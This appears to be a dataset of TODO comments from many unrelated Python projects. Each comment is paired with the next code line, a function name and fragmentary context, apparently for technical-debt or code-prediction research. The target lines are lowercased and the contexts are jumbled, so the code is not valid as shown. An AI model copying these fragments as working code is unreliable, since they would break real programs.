# todo: replace with path transformation functions </s> hfs_path = xl_workbook.properties().get(kw.full_name)	get_fullname def get_fullname(xl_workbook): if hfs_path == xl_workbook.properties().get(kw.name): return hfs_path
assert len(config['sources']) == 1  # todo: merge multiple sources </s> for source in config['sources']:	make_tasks query = dict(time=time_period) workflow = GridWorkflow(index, grid_spec=get_grid_spec(config)) data = workflow.list_cells(product=source['product'], cell_index=(15, -40), **query) masks = [workflow.list_cells(product=mask['product'], cell_index=(15, -40), **query)
#todo: remove expressions </s> firstnote.duration.quarterlength = self.quarterlength	Trill for i in range(numberOfTrillNotes): firstNote = copy.deepcopy(srcObject) secondNote = copy.deepcopy(srcObject) secondNote.duration.quarterLength = self.quarterLength
# todo make this configurable </s> def get_prefix_color(prefix):	get_prefix_color if prefix == "&": return "lightgreen"
# todo allow repose (is not affected by createfrompose) </s> return self.tailpos.copy()	getRestTailPos def getRestTailPos(self): The head position of this bone in world space.
# todo: this updates the resolution upon initialization and makes the </s> self.scale.set_value(xres)	_init_values self.index_label.set_text("Resolution {}".format(resolution.index)) self.scale.props.adjustment.configure(xres, minres, maxres, 50, 50, 0)
# todo: udpoutgoing style buffer </s> data = dustpacket(addr, data)	send_to def send_to(data, addr): udp_socket.sendto(data, 0, addr)
pass  # todo: why ignore unicodedecodeerror? </s> elif fact.istuple:	createFacts addLocallyReferencedFile(elt, filingFiles) except (XMLSyntaxError, UnicodeDecodeError): newTuple = targetInstance.createFact(fact.qname, parent=parent) newFactForOldObjId[fact.objectIndex] = newTuple
# todo: these 2 little simplifications can reduce test time by 30-40%, to do in test framework </s> save(client.cache.settings_path, "")	test_package_revision_mode def test_package_revision_mode(): client = TestClient() save(client.cache.default_profile_path, "") client.run("config set general.default_package_id_mode=package_revision_mode")
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> sampleparameters = {	test_acquire_token_with_user_pass def test_acquire_token_with_user_pass(self): "tenant" : "common", "authorityHostUrl" : "https://login.windows.net",
# todo: adjust dimension order for tf2 broadcasting </s> p_safe = tf.compat.v1.where(	_compute_2d_sparsemax p = tf.math.maximum( tf.cast(0, logits.dtype), z - tf.expand_dims(tau_z, -1)) tf.math.logical_or( tf.math.equal(k_z, 0), tf.math.is_nan(z_cumsum[:, -1])),
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: discriminate between worksheet & workbook ranged names </s> self._rangednames = np.zeros(shape = (int(self.app.activeworkbook.names.count),1), dtype=[('id', 'int_'), ('name', 's200'), ('formula', 's200')])	ExcelComWrapper self.app.DisplayAlerts = 0 self.app.Workbooks.Open(self.filename) for i in range(0, self.app.ActiveWorkbook.Names.Count): self._rangednames[i]['id'] = int(i+1)
# todo: fix this in a cleaner way </s> if isinstance(evidence_card, np.ndarray):	TabularCPD if evidence_card is not None: if not isinstance(evidence_card, (list, set, tuple)): evidence_card = list(evidence_card) elif isinstance(evidence_card, (int, float)):
# todo: does this need to be made more efficient? </s> p1 = future.futureparser()	RunCompiler elif mode == "exec": frame = pyassem.Frame("<module>", filename) p2 = future.BadFutureParser() p1.Dispatch(as_tree)
# todo add </s> pass	get_begidx def get_begidx():
# todo configurable </s> if 'identityfile' in user_config:	paramiko_connection if 'proxycommand' in user_config: parameters['sock'] = paramiko.ProxyCommand(user_config['proxycommand']) parameters['key_filename'] = user_config['identityfile'] client.connect(**parameters)
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
# todo hotfix for unnecessary weights in old adapters </s> unexpected_keys = [k for k in loading_info["unexpected_keys"] if "adapter_attention" not in k]	test_load_adapter_from_hub ) self.assertEqual(0, len(loading_info["missing_keys"])) self.assertEqual(0, len(unexpected_keys)) self.assertIn(adapter_name, model.config.adapters.adapters)
# todo: is there a nicer way to do this? if i add a new grep plugin i won't </s> self._w3af.plugins.get_plugin_inst('grep', pname))	setUp self._plugins.append(
#todo move this up to not be a nested method </s> def circular_sequence(seq):	resubmit_to_processor import urllib import urllib2 i = 0 while True:
#todo - complete implementation of these apis </s> return faults.fault(faults.portnotfound(e))	get_resource except exception.PortNotFound as e:
# todo: use nestedbuffers instead of saving by value </s> start = self.get_buffer().find(b'agesa!')	_parse_agesa_version def _parse_agesa_version(self): version_string = self[start:start + 36] agesa_magic = version_string[0:8]
# todo: clear last object inspector requests dictionary </s> assert cmd.get("source")	_cmd_Run def _cmd_Run(self, cmd): self._execute(cmd.source, timeout=SECONDS_IN_YEAR, capture_stdout=False) return {}
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
async_pub['tag'],  # todo: fix </s> async_pub['jid'],  # todo: fix	wrapper low, user, False,  # Don't daemonize
# todo: check to make sure time points match </s> self.uout = np.array(u)	__init__ self.xout = np.array(x) self.nstates = self.xout.shape[0] if sys is not None: if sys.ninputs != self.ninputs:
#todo: check the data! </s> count = 0	test_urlbuilder_loop pipe_def = self._get_pipe_def("pipe_e65397e116d7754da0dd23425f1f0af1.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetCollectionTagAssociation def test_HistoryDatasetCollectionTagAssociation(model, session, history_dataset_collection_association, tag, user): cls = model.HistoryDatasetCollectionTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
pass # todo </s> elif selection == 'page':	do_response_ok dialog.destroy() elif selection == 'selection': page = self.ui.page # TODO make this a user input exporter.export_page(dir, page)
# todo: make return values consistent across both *repo classes! </s> return [{u'file': f, u'success': true} for f in urls]	add_urls backend=backend, log_online=True, log_stderr=False, cwd=cwd)
# todo: move this into onnx main library </s> yield caffe2.python.utils.makeargument(kmap(k), v)	caffe2 for k, v in self.items():
# todo: this should be a separate test </s> self.asserttrue(iterable.closed, true)	test_keyboard_interrupt_is_captured with self.assertRaises(KeyboardInterrupt): response = list(response) self.assertEquals(len(self.client.events), 1) event = self.client.events.pop(0)
# todo:@zhui add support for 'mean', 'max', 'min' function. </s> assert reduce_func == "sum", "only implement 'sum' function right now. maybe you can update paddlepaddle version to fix this problem."	_send_recv feature (Tensor | Tensor List): the node feature of a graph. reduce_func (str): 'sum', 'mean', 'max', 'min' built-in receive function. src, dst = self.edges[:, 0], self.edges[:, 1] msg = self.send(
# todo(eric ayers) not really part of the test, just to detect the cache poisoning </s> before_support_dir = config.from_cache().getdefault('pants_supportdir')	DISABLED_test_gen_tasks_options_reference_data def DISABLED_test_gen_tasks_options_reference_data(self): Goal.by_name('jack').install(TaskRegistrar('jill', DummyTask)) oref_data = reflect.gen_tasks_options_reference_data()
# todo: funcbody </s> self.assertequal(7, p._pos)	testFunctionNoArgs self.assertIsNotNone(node)
# todo: this is a work around for infinite blocking wait in storage </s> parse_error_queue = none	ProcessSources parse_error_queue = self._parse_error_queue else: storage_writer_process = MultiProcessStorageWriterProcess( self.event_object_queue, self._extraction_complete_event,
# todo: change config values instead of overwriting files on disk </s> conf_path = os.path.expanduser('~/.tcms.conf')	_fixture_setup self.api_user.set_password('testing') initiate_user_with_default_setups(self.api_user) conf_fh = open(conf_path, 'w') conf_fh.write("""[nitrate]
# todo: duplicate + replace with psutil.getloadavg()? (available in 5.6.2) </s> load1m, _, _ = os.getloadavg()	mon_turbo def mon_turbo(): print("\n" + "-" * 5 + "\n") cpuload = p.cpu_percent(interval=1) print("Total CPU usage:", cpuload, "%")
# todo move to another thread if we need to process messages </s> logger.debug(u'starting glib main loop')	setup def setup(self): self.dbus_objects.append(MprisObject(self.core_queue)) loop = gobject.MainLoop() loop.run()
# todo: stop ignoring these once we have proper handling for these messages. </s> ignored_commands = (commands.transactions, commands.newblock, commands.newblockhashes)	StateDownloader async def _handle_msg( self, peer: ETHPeer, cmd: Command, msg: _DecodedMsgType) -> None: if isinstance(cmd, ignored_commands): pass
# todo: createpropertyconditionex with propertyconditionflags_ignorecase </s> new_cond = _iuia.createpropertycondition(	_build_condition full_cond = _iuia.CreateAndCondition(new_cond, full_cond) if title: _UIA_dll.UIA_NamePropertyId, title) full_cond = _iuia.CreateAndCondition(new_cond, full_cond)
#todo: define tests which check db contents </s> test_gdf = gdf() # test default configuration	test_GDF_get_grouped_slices def test_GDF_get_grouped_slices(self): "Test GDF get_grouped_slices function" ndarray_dict = test_gdf.get_grouped_slices(self.TEST_2D_DIMENSION_RANGE_DICT) ndarray_dict = test_gdf.get_grouped_slices(self.TEST_2D_DIMENSION_RANGE_DICT, ndarray_type_tags=['LS5TM'])
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_emergency_erase = p_operation.add_parser( "emergency-erase", help="emergency erase firmware")
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo: remove this log once we find out what's causing oom </s> log.info('running readthedocs.builds.tasks.sync_versions_task. locals=%s', locals())	sync_versions_task :returns: `True` or `False` if the task succeeded. project = Project.objects.get(pk=project_pk) current_stable = project.get_original_stable_version() if current_stable is not None:
# todo: and netcdf writer will be more generic </s> su_descriptor = index_netcdfs([filename[7:]])[filename[7:]]	create_storage_unit except OSError: pass return StorageUnit([dataset.id for dataset in datasets], mapping,
# todo: find these references and ensure they are closed </s> if is_win:	close if self.git: self.git.clear_cache() gc.collect() gitdb.util.mman.collect()
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_arguments @classmethod def add_arguments(cls, parser): p_index = p_operation.add_parser( "index", help="discover and verify raw disk image contents and MFM sectors")
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: summary hash for new current id </s> output_data_container.append(current_id, output.data_inputs, output.expected_outputs)	handle_fit context ) return self, output_data_container
# todo - make this work on loop with more than two links </s> flt_parallel = lambda loop: round(loop.calc_angle(),3) == 3.142	make_railing loops = list(set(loops)) if remove_colinear: flt_mid = lambda loop: loop.link_loop_next in loops and loop.link_loop_prev in loops loops = [l for l in loops if not (flt_parallel(l) and flt_mid(l))]
# todo: is region (lla | atn | odn | others?) important? </s> mqtt.ws_set_options(path="/chat?sid={}".format(session_id), headers=headers)	connect "Host": "edge-chat.facebook.com", } mqtt.tls_set() response_code = mqtt.connect("edge-chat.facebook.com", 443, keepalive=10)
# todo: if first epsilon, repeat with smaller epsilons </s> return	GradientSignAttack _, is_adversarial = a.predictions(perturbed) if is_adversarial:
# time.sleep(40)  # todo: should remove after polling get. </s> mpc_1_2_3 = op(mpc_1_2, tensor_pointer_3)	test_tensor_abstraction_pointer mpc_1_2 = op(tensor_pointer_1, tensor_pointer_2) mpc_1_2.block_with_timeout(secs=40) mpc_1_2_3.block_with_timeout(secs=40) exp_res = op(data_1, data_2)
pass # todo </s> return false	_list if type == u'artist' and artist is not None:
# todo: what actually raises valueerror in the following code? </s> try:	readline def readline(self, *args, **kwargs): result = super(GzipStreamFile, self).readline(*args, **kwargs) return result
# todo: determine if this is object store safe and what needs to be </s> files_path = "%s_files" % input_file[0:-len(".dat")]	__upload_input_files input_upload_response = self.client.upload_input(input_file) self.file_renames[input_file] = input_upload_response['path'] if os.path.exists(files_path): for extra_file in os.listdir(files_path):
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_wait_server_error mock_nova.servers.get.return_value = build_server mock_nova.servers.list.side_effect = [[build_server], [error_server]] self.assertRaises( exc.OpenStackCloudException,
# todo: confirm change made it to elasticserach </s> def _make_a_case(self, case_id, case_name):	CasePillowTest self.assertEqual(case.case_id, change_meta.document_id) self.assertEqual(self.domain, change_meta.domain) with drop_connected_signals(case_post_save):
# todo: remove this monkeypatch once upstream class is fixed. </s> _patch_zone(zone)	_list_records filter_query = {"rdtype": rtype, "name": name, "content": content} with localzone.manage(self.filename, self.origin, autosave=True) as zone: records = zone.find_record(**filter_query)  # pylint: disable=no-member result = []
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: check degree minute second formats? </s> self._check_latitude_longtiude_range(geopoints)	cast_object geopoints = [decimal.Decimal(longitude), decimal.Decimal(latitude)] return geopoints except decimal.DecimalException, e:
# todo: keep map sorted chronologically </s> for script in self._revision_map.values():	_get_head def _get_head(self): if script.upgrade is None \ and script.downgrade in self._revision_map:
# todo: implement bip45/67/electrum/? </s> if self.scheme == 'bip44':	utxos_update :return int: Number of new UTXO's added network, account_id, acckey = self._get_account_defaults(network, account_id) depth = 5 else:
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
# todo at_list </s> f.write(u" at todo")	print_imspec f.write(' '.join(imspec[0])) if imspec[3] is not None: if imspec[2] is not None: f.write(u" as %s" % (imspec[2], ))
#rnn_cell = tf.nn.rnn_cell.dropoutwrapper(rnn_cell, input_keep_prob=1.0, output_keep_prob=1.0)  # todo: custom values (warning: no dropout when testing !!!, possible to use placeholder ?) </s> rnn_cell = tf.nn.rnn_cell.multirnncell([rnn_cell] * args.num_layers, state_is_tuple=true)	get_rnn_cell with tf.variable_scope('weights_' + scope_name): rnn_cell = tf.nn.rnn_cell.BasicLSTMCell(args.hidden_size, state_is_tuple=True)  # Or GRUCell, LSTMCell(args.hidden_size) return rnn_cell
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.jsm", let i = 0;
delattr(self, "runtime_coef") # todo, better way to pass variables from initialiszer </s> return weight	get_weight if hasattr(self, 'runtime_coef'): weight *= self.runtime_coef
# todo: https://github.com/turicas/brasil.io/issues/210 </s> return file	clean_file msg = f"Formato de planilha inválida. O arquivo precisa estar formatado como {valid}." raise forms.ValidationError(msg)
# todo: then we can pull the descriptor out of the tile_spec </s> return storage.in_memory_storage_unit_from_file(filename, datasets, storage_type)	_create_storage_unit filename = storage.generate_filename(tile_index, datasets, storage_type) storage.create_storage_unit_from_datasets(tile_index, datasets, storage_type, filename)
# todo add locales </s> raise yunohosterror("bad_value_type", value_type=type(xmpp))	domain_set_settings xmpp = xmpp in ["True", "true", "1"] except: domains[domain]["xmpp"] = xmpp setting_set = True
# todo: large gains also expected when precalculating psi. </s> psi = segment_axis(y, k, 1, axis=-1)[:, :t - delay - k + 1, ::-1]	get_correlations_narrow_v5 def get_correlations_narrow_v5(Y, inverse_power, K, delay): D, T = Y.shape Psi_conj_norm = inverse_power[None, delay + K - 1:, None] * Psi.conj() correlation_matrix = np.einsum('dtk,etl->kdle', Psi_conj_norm, Psi)
# todo legacy method to be removed/refactored </s> from corehq.apps.commtrack.exceptions import (	supply_point_index_mapping def supply_point_index_mapping(self, supply_point, clear=False): LinkedSupplyPointNotFoundError )
# resume normal sphinx.ext.autodoc operation </s> return super(functiondocumenter, self).format_name()	format_name return super(FunctionDocumenter, self).format_name() if not self.objpath: if len(self.objpath) > 1: return super(FunctionDocumenter, self).format_name()
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transactions_contents_invalid def test_fail_transactions_contents_invalid(self):
# todo[k]: fix this properly. </s> if revision_type == 'delete' and obj.api_object_name == 'message' and \	create_revision if revision_type != 'delete': revision.snapshot = encode(obj) obj.is_draft: revision.snapshot = {'version': obj.version}
# todo (fpliger):   this handles pandas api change so users do not experience </s> try:	_get_range factors = values.drop_duplicates() if sort: factors.sort_values(inplace=True) except AttributeError:
# todo remove me (das2 experiment) </s> for address, data in packets:	data_came_in def data_came_in(self, packets): if packets: if address[0] == "130.161.211.209": print "%.1f %30s <- %15s:%-5d %4d bytes" % (time(), "???", address[0], address[1], len(data))
# todo: is that right? </s> pass	unindex_answers es.delete(index, doc_type=Question._meta.db_table, id=doc_id) except pyes.exceptions.NotFoundException:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transaction_not_trytes def test_fail_transaction_not_trytes(self): ``transaction`` contains invalid characters.
#@todo: move to utils in 0.4.10 </s> def decode(string, encoding='utf8'):	decode if type(string) is str: return string.decode(encoding, "replace")
# todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	GETVIEWSTATE unwatchedXML = XML.ElementFromURL(fetchUrl) else: request = urllib2.Request(fetchUrl) request.add_header(
# todo: just access the original event position, rather </s> p1 = np.array(event.last_event.pos)[:2]	PanZoomViewer event.handled = True elif 2 in event.buttons: p2 = np.array(event.pos)[:2] p1c = event.map_to_canvas(p1)[:2]
# todo fix. </s> self.assertequals(reil_ctx_out["mm0"], res)	test_movq_1 res = 0x8765432187654321 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["rax"], ctx_init["rax"])
# todo: change logic to support "--submit" </s> for group in groups:	MapNetwork else: groups = [groups] op = opcodes.OpNetworkConnect(group_name=group, network_name=network,
# todo/fixme: are these correct.. </s> d = np.shape(v)[0]	wishart_rand ----------- nu : int if nu < D: raise ValueError("Degrees of freedom must be equal or greater than the "
# todo: duplicate + replace with psutil.getloadavg()? (available in 5.6.2) </s> load1m, _, _ = os.getloadavg()	mon_turbo def mon_turbo(): print("\n" + "-" * 5 + "\n") print("Total CPU usage:", cpuload, "%") print("Total system load:", load1m, "\n")
# todo featureparams nameids </s> t.table.scriptlist.mapfeatures(featuremap)	layoutPreMerge featureMap = {i:v for i,v in enumerate(t.table.FeatureList.FeatureRecord)}
# todo: revert this. </s> from astropy.tests.helper import quantity_allclose	HeliographicStonyhurst _default_wrap_angle = 180*u.deg def __init__(self, *args, **kwargs): _rep_kwarg = kwargs.get('representation', None) wrap = kwargs.pop('wrap_longitude', True)
start_time_system_s = none  # todo </s> start_time_synced_s = none  # todo	recording_update_pupil_mobile_to_pprf_2_0 info_csv = utils.read_info_csv_file(rec_dir) recording_uuid = None #TODO duration_s = None  # TODO recording_software_name = None  # TODO
"tabsize": 4,  # todo: fetch these from the project settings / global settings </s> "insertspaces": true	LspFormatDocumentRangeCommand "range": Range.from_region(self.view, region).to_lsp(), "options": { } }
# todo: account for distance from mid </s> returns imbalances between bids and offers for each data point in	get_imbalance def get_imbalance(books): DataFrame of book data total_bid_size = books.bids.apply(lambda x: x.amount.sum())
# todo only return results within uri roots given by ``uris`` </s> if query is none:	find_exact def find_exact(self, query=None, uris=None): query = {} self._validate_query(query)
# todo: cannot be loaded with plugins; improve this solution </s> d = helpers.import_from_plugin("googleapiclient.discovery", plugin="bigquery")	create_dialect def create_dialect(self, resource, *, descriptor): try: if isinstance(resource.source, d.Resource): return BigqueryDialect(descriptor)
# todo: uncomment when adding support for literal hex bytes </s> print(b'hello world   '.isupper())	test_isupper print(b'hello world'.isupper())
# todo: rewrite using six.b() </s> def try_convert(data):	try_convert if isinstance(data, str): return data
uploader.upload_file(file, container='export') # todo: right container folder?! </s> finally:	export_json memzip = make_onefile_memzip(datafile.name, '%s_task.json' % name) file = FileStorage(filename='%d_%s_task_json.zip' % (app.id, name), stream=memzip) datafile.close() json_task_run_generator = respond_json("task_run", app.id)
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
return skiptest("test doesn't pass yet")  # todo(frostig) </s> def fun(x, y):	testDot def testDot(self): return lax.dot(x, y) xs = [
# todo better check would be if the node is linked to the output and actually used </s> return utils_node.has_nodes(node_tree, "luxcorenodetexpointiness", true)	uses_pointiness def uses_pointiness(node_tree):
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
description = ''  # todo(wking): store descriptions </s> try:	_regenerate_index def _regenerate_index(self): index_data = {} namespace_paths = list( store.list_directory(path=store.repositories))
# todo document </s> def _null_mip(subsystem):	_null_mip This is the MIP associated with a reducible subsystem.""" return BigMip(subsystem=subsystem,
).consume()  # todo see issue 170 </s> for instance in reservation["instances"]:	load_ec2_instances Region=region, aws_update_tag=aws_update_tag, instanceid = instance["InstanceId"] monitoring_state = instance.get("Monitoring", {}).get("State", "")
# todo scope the cleanup to the current project - https://github.com/lyft/cartography/issues/381 </s> cleanup_gcp_buckets(neo4j_session, common_job_parameters)	sync_gcp_buckets bucket_list = transform_gcp_buckets(storage_res) load_gcp_buckets(neo4j_session, bucket_list, gcp_update_tag)
# todo: error handling </s> backend = plugin.get(backend, 'backend')()	Graph backend = plugin.get('default', 'backend')() elif not isinstance(backend, Backend): self.__backend = backend self.__parser = None
# todo(kpy): this only works for subdomains that have a single fixed </s> time_zone_offset = timedelta(0)	get reveal_url = reveal.make_reveal_url(self, content_id) show_private_info = reveal.verify(content_id, self.params.signature) if self.config.time_zone_offset: time_zone_offset = timedelta(0, 3600*self.config.time_zone_offset)
# todo: one day this can be removed (once all our users have updated) </s> old_colab_dir = os.path.realpath(os.path.expanduser(os.path.join('~', '.floobits')))	rename_floobits_dir def rename_floobits_dir(): if os.path.isdir(old_colab_dir) and not os.path.exists(G.BASE_DIR): print('renaming %s to %s' % (old_colab_dir, G.BASE_DIR))
# todo new message here </s> routing_key = 'sms.ack.%s' % (self.transport_name)	submit_sm_resp log.msg("Mapping transport_msg_id=%s to sent_sms_id=%s" % ( transport_msg_id, sent_sms_id)) message = Message(**{ 'id': sent_sms_id,
# todo: xxx </s> for item in config['from']:	on_feed_filter action = config['action'] result = [] for input_name, input_config in item.iteritems(): input = get_plugin_by_name(input_name)
# todo(mattjj): if we instead lower directly to lax.gather, we can probably </s> out = lax.index_take(arr, flat_idx, tuple(range(len(idx))))	_rewriting_take idx = [idx] flat_idx = tuple([mod(ravel(x), arr.shape[i]) for i, x in enumerate(idx)]) return lax.reshape(out, idx[0].shape + _shape(arr)[len(idx):]) elif _is_advanced_int_indexer(idx):
# todo(nmigen-0.2): remove this </s> return layout(obj, src_loc_at=1 + src_loc_at)	cast return obj
# todo this should be a return and printed elsewhere </s> print('area under pr curve (au_pr): %0.2f' % area)	pr_curve precision, recall, thresh = skmetrics.precision_recall_curve(true_values, predictions) area = skmetrics.average_precision_score(true_values, predictions) d = (precision - 1) ** 2 + (recall - 1) ** 2 ind = np.where(d == np.min(d))
# todo(tianjianlu): fails on a100 gpu. </s> @jtu.skip_on_devices("gpu")	testQdwhWithUpperTriangularInputAllOnes for m, n in zip([8, 10, 20], [6, 10, 18]) for log_cond in np.linspace(1, _MAX_LOG_CONDITION_NUM, 4))) def testQdwhWithUpperTriangularInputAllOnes(self, m, n, log_cond): a = jnp.triu(jnp.ones((m, n))).astype(_QDWH_TEST_DTYPE)
# todo: remove in v1.2 </s> if len(kwargs) > 0:	__init__ **kwargs, ): warnings.warn( "Passing additional keyword parameters has no effect and is "
# todo: worry about concurrency </s> with open(path, "w+b") as file:	replace_dummy def replace_dummy(self, path): file.write(self.api.download(path)) os.remove(self.converter.add_dummy_ending(path))
# todo(rbharath): there should be some automatic check to ensure that all </s> model_params = {"nb_hidden": 10, "activation": "relu",	test_multitask_order input_transformers = [] task_type = "classification" "dropout": .5, "learning_rate": .01, "momentum": .9, "nesterov": False,
# todo ... </s> print()	main print() print("Find divisible by 6 via lambda:") print("Sorted list of words: ") list_of_words = ['CPython', 'read', 'improvements,', 'issues.', 'on', 'comprehensive', 'porting', 'potential',
# todo: change logic to c_leq based on benchmarking </s> transformationfactory('contrib.deactivate_trivial_constraints')\	solve_NLP_subproblem fixed_nlp.tmp_duals[c] = c_geq * max( 0, c_geq*(rhs - value(c.body))) .apply_to(fixed_nlp, tmp=True, ignore_infeasible=True) with SuppressInfeasibleWarning():
# todo(ochang): remove this once migrated to python 3. </s> if sys.version_info.major == 2:	exc_clear def exc_clear(): sys.exc_clear()
# todo handle algorithm </s> cipher = self._block(key)	encrypt_bulk :return: Encrypted data :rtype: bytes nonce = random(cipher.NONCE_SIZE) enc_data = cipher.encrypt(data, nonce=nonce)
# todo: reproduce and submit traceback to issue 41 </s> try:	_delete return Response('nohost') ipaddr = str(ipaddr)  # bug in dnspython: crashes if ipaddr is unicode, wants a str! kind = check_ip(ipaddr, ('ipv4', 'ipv6')) except ValueError:
# todo: add location info </s> errfmt.print_('getopts: option %r requires an argument.' % current)	_GetOpts if optarg is None: my_state.Fail() tmp = [qsn.maybe_shell_encode(a) for a in argv] stderr_line('(getopts argv: %s)', ' '.join(tmp))
# todo: a lousy way of propagating what will usually be </s> return self._realm_data	RealmDiscoverTask output = util.execWithCapture(REALM_TOOL_NAME, argv, filter_stderr=True) except OSError: realm_discovered, required_packages = self._parse_realm_data(output) self._realm_data.discovered = realm_discovered
# todo model? </s> cut_result_json = os.path.join(data_home, "cut_result.json")	classify limit: int = None, ): res = None stable = None
# todo(b/160795287): deprecate estimator based executor. </s> absl.logging.warning('support for estimator-based executor and model export'	eval_model_path if tf.io.gfile.exists(model_dir): try: ' will be deprecated soon. Please use export structure ' '<ModelExportPath>/eval_model_dir/saved_model.pb"')
# todo(guillermooo): remove this by 1.0 </s> def transplant_settings(old_fname, new_fname):	transplant_settings in @old_fname intact. @old_fname
# todo(stevemar): assert returned fields </s> + ' ' + self.object_name + ' --file tmp.txt')	test_object_save_with_filename self.openstack('object save ' + self.CONTAINER_NAME
# todo: set optimum flags for platform+compiler combo, see </s> options = []	configure_args def configure_args(self): if '+optflags' in self.spec: options.extend([
#todo: check this with robot </s> tracker_in_robot = list(translate) + list(angles_as_deg)	transformation_tracker_to_robot M_tracker_in_robot = transform_tracker_to_robot.M_tracker_to_robot @ M_tracker angles_as_deg, translate = dco.transformation_matrix_to_coordinates(M_tracker_in_robot, axes='rxyz') return tracker_in_robot
# todo: can be done faster by custom code </s> return self.getelemlastindexfromline(line) == line	isLastLineOfElem def isLastLineOfElem(self, line):
# todo(jk0): this will eventually need to take ssl into consideration </s> view = images_view.viewbuilderv11(1)	test_generate_alternate def test_generate_alternate(self): generated_url = view.generate_alternate(1) actual_url = "http://%s:%d//images/1" % (FLAGS.glance_host,
# todo: list is incomplete, to be completed for missing languages. </s> self.doc_subpages = {	__init__ self.interwiki_on_one_line = ['pl'] self.interwiki_attop = ['pl'] '_default': ((u'/doc', ), ['en']
# todo: use optparse command options instead. </s> spec_test_dir = sys_argv[1]	run_tests project_dir = PROJECT_DIR try: sys_argv.pop(1) except IndexError:
log_importance_weight = none  # todo: check the reason/behavior for this </s> variable = variable(distribution=distribution, value=value, address_base=address_base, address=address, instance=instance, log_prob=log_prob, log_importance_weight=log_importance_weight, observed=true, name=name)	sample log_importance_weight = float(log_prob) else: else: reused = False
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
raise mpdnotimplemented # todo </s> def _commands(self):	_commands @register(r'^commands$')
# todo: requires special treatment? </s> current_unit = line.variants[0].line[0]	research_ability :rtype: ...dataformat.expected_pointer.ExpectedPointer if isinstance(line, GenieVillagerGroup): else: current_unit = line.line[0]
# todo: verify this is a windows image </s> physical_layer_name = context.config.get(	determine_valid_kernels virtual_config_path = context.memory[virtual_layer_name].config_path if virtual_layer_name and isinstance(context.memory[virtual_layer_name], layers.intel.Intel): interfaces.configuration.path_join(virtual_config_path, "memory_layer"), None)
# todo: move instead of copy to save time? </s> source_file = os.path.join( job_working_directory, hda_tool_output.from_work_dir )	get_work_dir_outputs hda_tool_output = job_tool.outputs.get( joda.name, None ) if hda_tool_output and hda_tool_output.from_work_dir: destination = job_wrapper.get_output_destination( output_paths[ dataset.dataset_id ] ) if in_directory( source_file, job_working_directory ):
# todo: remove when the time is right. </s> if policy.expiration > end_of_policies_probationary_period:	_check_grant_requirements def _check_grant_requirements(self, policy): raise self.ActorError(f"The requested duration for this policy (until {policy.expiration}) exceeds the "
# todo: test for the _correct_ revision_id value. </s> if not activity.revision_id:	_delete_resources if not activity.id: assert False, "activity object has no id value" assert False, "activity has no revision_id value" assert activity.timestamp >= before and activity.timestamp <= after, \
# todo: need support mint and other distro based on ubuntu. </s> if gnomeversion.distributor == 'ubuntu':	parse_distro def parse_distro(): return file('/etc/issue.net').readline()[:-1] return GnomeVersion.distributor
# todo: currently mnn python binding have mem leak when creating mnn.tensor </s> input_elementsize = reduce(mul, input_shape)	yolo_predict_mnn image_data = preprocess_image(image, (height, width)) image_shape = image.size tmp_input = MNN.Tensor(input_shape, input_tensor.getDataType(),\ tuple(image_data.reshape(input_elementsize, -1)), input_tensor.getDimensionType())
#todo support host caches on multiple datastores </s> def configure_host_cache(host_ref, datastore_ref, swap_size_mib,	configure_host_cache host_cache_manager=None): Configures the host cahe of the specified host
# todo: encode / escape key </s> headers['x-bz-info-%s' % (key)] = value	upload_object headers['X-Bz-Content-Sha1'] = sha1.hexdigest() for key, value in meta_data: upload_data = self.ex_get_upload_data(container_id=container.extra['id']) upload_token = upload_data['authorizationToken']
pass  # todo - should this do something </s> press "leave domain" on users tab	on_btleavedomain_clicked def on_btleavedomain_clicked(self, widget, data=None):
